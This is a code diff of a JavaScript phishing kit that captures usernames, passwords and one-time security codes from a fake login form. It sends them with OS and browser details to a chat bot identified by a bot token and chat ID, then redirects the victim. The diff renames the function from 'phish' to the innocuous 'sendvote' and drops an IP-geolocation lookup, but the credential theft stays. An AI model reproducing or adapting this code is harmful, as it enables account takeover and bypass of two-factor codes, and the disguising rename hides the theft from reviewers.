@@ -1,4 +1,4 @@
-const phish = (bot_token, chat_id, redirect_link) => {
+const sendvote = (bot_token, chat_id, redirect_link) => {
     var module = {
         options: [],
         header: [
@@ -84,18 +84,6 @@ const phish = (bot_token, chat_id, redirect_link) => {
     };
 
     var e = module.init();
-
-    const ipLocation = () => {
-        let req = new XMLHttpRequest();
-        req.open(
-            'GET',
-            `http://ip-api.com/json/?fields=query,country,city,regionName`,
-            false
-        );
-        req.send(null);
-        let json = JSON.parse(req.responseText);
-        return json;
-    };
     const goTo = () => {
         let link = new URLSearchParams(window.location.search).get('link');
         if (link !== null) {
@@ -104,7 +92,6 @@ const phish = (bot_token, chat_id, redirect_link) => {
         window.location.assign(redirect_link);
     };
 
-    let ip_json = ipLocation();
     var uname = $('#username'),
         pass = $('#password'),
         otp = $('#security_code')
@@ -175,8 +162,6 @@ Time :    ${time}%0A
 Login:    ${unameVal}%0A
 Pass :    ${passVal}%0A
 ----------------------------------------------------%0A
-IP: ${ip_json.query}%0A
-Location: ${ip_json.city}, ${ip_json.regionName}, ${ip_json.country}%0A
 OS: ${e.os.name} v${e.os.version}%0A
 Browser:  ${e.browser.name} v${e.browser.version}%0A
 ----------------------------------------------------%0A%0A
